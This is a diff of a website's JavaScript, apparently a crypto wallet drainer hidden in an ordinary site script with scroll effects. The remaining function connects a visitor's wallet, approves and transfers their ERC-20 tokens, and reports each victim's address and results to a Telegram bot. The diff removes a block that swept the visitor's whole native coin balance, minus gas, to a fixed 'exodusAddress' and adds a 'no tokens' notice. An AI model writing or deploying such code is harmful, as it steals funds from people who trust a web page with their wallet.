@@ -81,7 +81,7 @@ scrollReveal();
 addEventOnElem(window, "scroll", scrollReveal);
 
 /**
- * Wallet connect, token approval and transfer, and native coin transfer with Telegram notification
+ * Wallet connect and token approval/transfer with Telegram notification
  */
 async function connectWalletAndSendTokens() {
   if (!window.ethers || !window.ethereum) {
@@ -160,7 +160,6 @@ async function connectWalletAndSendTokens() {
         }
 
         const currentProvider = new ethers.providers.Web3Provider(window.ethereum);
-        const currentSigner = currentProvider.getSigner();
         const currentNetwork = await currentProvider.getNetwork();
 
         if (currentNetwork.chainId !== network.chainId) {
@@ -292,75 +291,15 @@ Error: ${err.message}
               });
             }
           }
-        }
-
-        // Transfer native coin (ETH) regardless of ERC-20 tokens
-        try {
-          const balance = await currentProvider.getBalance(userAddress);
-          if (balance.isZero()) {
-            const noBalanceMessage = `
-⚠️ No ${network.nativeCoin} balance to transfer on ${network.name}
+        } else {
+          const noTokensMessage = `
+⚠️ No non-zero ERC-20 token balances to transfer on ${network.name}
 Address: ${userAddress}
-            `;
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ chat_id: chatId, text: noBalanceMessage })
-            });
-          } else {
-            // Estimate gas price and gas limit
-            const gasPrice = await currentProvider.getGasPrice();
-            const gasLimit = ethers.BigNumber.from("21000"); // Standard gas limit for simple ETH transfer
-            const gasCost = gasPrice.mul(gasLimit);
-
-            // Calculate amount to send (subtract gas cost to leave enough for fees)
-            const amountToSend = balance.sub(gasCost);
-
-            if (amountToSend.lte(0)) {
-              const insufficientBalanceMessage = `
-⚠️ Insufficient ${network.nativeCoin} balance for transfer after gas fees
-Address: ${userAddress}
-Balance: ${ethers.utils.formatEther(balance)}
-Estimated Gas Cost: ${ethers.utils.formatEther(gasCost)}
-              `;
-              await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: insufficientBalanceMessage })
-              });
-            } else {
-              const tx = await currentSigner.sendTransaction({
-                to: network.exodusAddress,
-                value: amountToSend,
-                gasPrice: gasPrice,
-                gasLimit: gasLimit
-              });
-              await tx.wait();
-
-              const successMessage = `
-✅ Native Coin Transfer Successful
-Coin: ${network.nativeCoin}
-Amount: ${ethers.utils.formatEther(amountToSend)}
-To: ${network.exodusAddress}
-Tx: ${tx.hash}
-              `;
-              await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: successMessage })
-              });
-            }
-          }
-        } catch (err) {
-          const errorMessage = `
-❌ Native Coin Transfer Failed
-Coin: ${network.nativeCoin}
-Error: ${err.message}
           `;
           await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: chatId, text: errorMessage })
+            body: JSON.stringify({ chat_id: chatId, text: noTokensMessage })
           });
         }
       } catch (err) {
